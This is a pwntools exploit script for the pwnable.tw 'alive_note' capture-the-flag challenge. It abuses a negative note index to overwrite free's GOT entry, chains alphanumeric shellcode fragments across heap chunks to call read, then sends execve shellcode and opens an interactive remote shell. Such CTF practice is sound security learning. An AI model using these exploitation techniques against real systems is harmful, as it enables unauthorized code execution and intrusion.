from pwn import *

#p = process("./alive_note")
p = remote("chall.pwnable.tw", 10300)
elf = ELF("./alive_note")
context.log_level = "debug"
context.arch = "i386"

free_offset = -27

#free reg info
'''
 EAX  0x804b018 ◂— 'bbbb' (free arg)
 EBX  0x0
 ECX  0x0
 EDX  0x0
 EDI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
 ESI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
 EBP  0xffffcee8 —▸ 0xffffcef8 ◂— 0x0
 ESP  0xffffcebc —▸ 0x80488ef (del_note+81) ◂— add    esp, 0x10
 EIP  0x804b008 ◂— 'aaaa' (code)
'''

def get_alpha_shellcode(raw):
    with open("./alpha3/raw.in", "wb") as r:
        r.write(asm(raw))
    os.system('cd alpha3;python ALPHA3.py x86 ascii rax --input="raw.in" > alpha.out')
    res = b""
    with open("./alpha3/alpha.out", "rb") as a:
        res = a.read()
    return res

def add(idx:int, name):
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Name :")
    p.sendline(name)

def show(idx:int):
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())

def delete(idx:int):
    p.recvuntil(b"Your choice :")
    p.sendline(b"3")
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())

def chunk_pad(num):
    for i in range(num):
        add(10, b"aaaaaaa")

def exp():
    #build shellcode
    ## call SYS_read to read execve shellcode

    ### PYjzZu9
    part1 = '''
    push eax
    pop ecx
    push 0x7a
    pop edx
    '''
    part1 = asm(part1) + b"\x75\x39"
    add(-27, part1)
    chunk_pad(3)

    ### SXH0AAu8
    part2 = '''
    push ebx
    pop eax
    dec eax
    xor BYTE PTR [ecx+0x41], al
    '''
    part2 = asm(part2) + b"\x75\x38"
    add(0, part2)
    chunk_pad(3)

    ### 490ABSu8
    part3 = '''
    xor al, 0x39
    xor BYTE PTR [ecx+0x42], al
    push ebx
    '''
    part3 = asm(part3) + b"\x75\x38"
    add(0, part3)
    chunk_pad(3)

    ### Xj3X40u9
    part4 = '''
    pop eax
    push 0x33
    pop eax
    xor al, 0x30
    '''
    part4 = asm(part4) + b"\x75\x39"
    add(1, part4)
    chunk_pad(3)

    ### 02F
    part5 = b"\x30\x32\x46"
    add(2, part5)

    #gdb.attach(p, "b *0x804b008\nb *0x804b10b\nc\n")
    delete(1)

    ## write shellcode to run next
    shellcode = asm(shellcraft.sh())
    payload = b"a"*0x43 + shellcode
    p.sendline(payload)

    # getshell
    p.interactive()

if __name__ == "__main__":
    exp()
